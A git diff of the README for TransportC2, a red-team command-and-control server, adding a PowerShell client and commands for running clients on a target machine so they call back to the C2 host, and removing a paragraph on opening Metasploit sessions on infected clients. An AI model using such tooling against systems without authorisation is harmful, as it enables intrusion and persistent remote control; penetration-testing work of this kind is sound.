@@ -1,10 +1,11 @@
 # TransportC2
 
 ## Summary
+
+![](https://img.shields.io/badge/Status-PoC-orange.svg)&nbsp;&nbsp;
+![](https://img.shields.io/badge/Development-Active-green.svg)&nbsp;&nbsp;
+
 TransportC2 is a command and control server with a full UI that allows interaction with clients through a private web interface. This allows penetration testers and red teamers the ability maintain their connection without being tied to an active session. Once logged into the admin interface, add new authorized users for team interaction and collaboration. 
-
-
-Why "Transport"? TransportC2 is meant to be a long-term channel that allows users to direct payloads to other, shorter-term C2's for further post-exploitation. This is exemplified by the built-in Metasploit module, simply execute "msfpayload 192.168.1.1 4444" to open a meterpreter session on an infected client.
 
 
 ## Server
@@ -30,16 +31,21 @@ sudo systemctl status transportc2.service
 
 
 ## Client
-As of now, TransportC2 has a PoC client written in Python 2/3. Clients will make HTTPS requests to the C2 server and mimic a web connection. Variables at the top of the client file can be modified to change client check-in intervals, requesting page, etc. 
+As of now, TransportC2 has clients written in Python 2/3 and PS1. Clients will make HTTPS requests to the C2 server and mimic a web connection. Variables at the top of the client file can be modified to change client check-in intervals, requesting page, etc. 
 
 #### Client Usage
 Run the client on a target machine:
 ```bash
 python3 client.py 127.0.0.1 443
 ```
+```bash
+.\client.ps1 127.0.0.1 443
+```
 
 #### Client Commands
 Once a client is connected, login to the Admin Interface to execute one of the following commands:
+
+*Built-in Metasploit payload only available for python client at this time*
 ![HelpMenu](server/AdminServer/static/img/help.png)
 
 #### MSF Listener
@@ -54,6 +60,7 @@ execute
 
 ## Screenshots
 ![Login](server/AdminServer/static/img/login.png)
+
 ![CmdPanel](server/AdminServer/static/img/cmd.png)
 
 ## Contributors 
